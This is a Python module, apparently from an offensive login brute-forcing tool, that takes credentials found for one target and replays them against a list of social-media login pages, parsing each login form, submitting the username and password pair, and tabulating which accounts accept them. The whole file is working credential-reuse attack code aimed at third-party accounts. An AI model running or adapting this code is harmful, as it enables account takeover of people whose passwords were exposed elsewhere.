from modules import loginbrute
import data, sys
from utils import events
from libs.mbrowser import Browser
from cores.check import parseLoginForm

try:
	from Queue import Queue
except ImportError:
	from queue import Queue


def do_job(jobs):
	for job in jobs:
		job.start()
	
	for job in jobs:
		job.join()


def submit(url, options, tryCreds, result):
	try:
		proc = Browser()
		
		events.info("Checking %s" %(url), "REAUTH")
		
		proc.open(url)
		loginInfo = parseLoginForm(proc.forms())
	
	except Exception as error:
		events.error("%s" % (error), "REAUTH")
		sys.exit(1)
	
	if not loginInfo:
		events.error("No login form at %s" % (url), "REAUTH")
		sys.exit(1)

	else:
		try:
			options.url = url
			
			loginbrute.submit(
				# Reverse username + password. Dynamic submit in loginbrute
				options, loginInfo, tryCreds[-2:][::-1], result
			)
		except Exception as error:
			events.error("%s" % (error), "REAUTH")
			sys.exit(1)


def run(options, creds):
	social_urls = data.social_urls().replace("\t", "").split("\n")
	
	for url in social_urls:
		if options.url in url:
			social_urls.remove(url)
	
	result = Queue()
	# workers = []
	
	try:
		for tryCreds in creds:
			for url in social_urls:
				submit(url, options, tryCreds, result)
			
			# if len(workers) == options.threads:
			# 	do_job(workers)
			# 	del workers[:]
			
			# worker = threading.Thread(
			# 	target = submit,
			# 	args = (url, options, tryCreds, result)
			# )
			
			# worker.daemon = True
			# workers.append(worker)
	
	# do_job(workers)
	# del workers[:]
	
	
	except KeyboardInterrupt:
		events.error("Terminated by user", "STOPPED")
		sys.exit(1)
	
	except SystemExit:
		events.error("Terminated by system", "STOPPED")
	
	except Exception as error:
		events.error("%s" % (error), "REAUTH")
		sys.exit(1)
	
	finally:
		result = list(result.queue)
		
		if len(result) == 0:
			events.error("No valid account found", "RESULT")
		else:
			from utils import print_table
			print_table(("Target", "Username", "Password"), *result)
